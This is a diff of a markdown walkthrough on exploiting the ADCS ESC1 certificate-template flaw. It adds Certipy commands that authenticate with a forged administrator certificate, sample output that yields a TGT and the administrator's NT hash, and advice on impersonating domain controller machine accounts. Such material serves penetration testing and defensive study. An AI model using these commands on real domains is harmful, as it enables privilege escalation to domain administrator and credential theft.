@@ -52,10 +52,7 @@ This means that Any user can **request a certificate that says they're the domai
 
 Exploiting an ESC1 vulnerability typically involves two main steps:
 1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target(administrator).
-2. Using the obtained certificate to authenticate as that target.
-
-
-
+ 
 ```bash
 certipy req \
     -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -74,8 +71,35 @@ certipy req \
 > [!NOTE]
   💡 : To find the SID and other attributes of a target user like 'administrator', you can use the command: `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`
   
+2. Using the obtained certificate to authenticate as that target.
 
+```bash
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
+```
 
+expected output
+```bash
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@lol.local'
+[*]     SAN URL SID: 'S-1-5-21-1558345677-4257867870-1842270656-500'
+[*] Using principal: 'administrator@lol.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@lol.local': aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+
+```
+
+> [!NOTE]
+  _Note on targeting machine accounts:_ If the goal is to impersonate a machine account (e.g., a Domain Controller like `DC01$`), the `-dns` parameter should be used with the FQDN of the machine (e.g., `-dns 'dc01.corp.local'`) instead of `-upn`. This correctly populates the dNSName field in the SAN, which is typically used for machine identity. The `-sid` parameter remains the same, specifying the machine account's SID. While using `-upn` with a machine account's UPN (e.g., `DC01$@corp.local`) might sometimes work, `-dns` is the more appropriate SAN type for machine identities
+  
+  
+
+---
 
 
 We can request a certificate for the domain administrator.
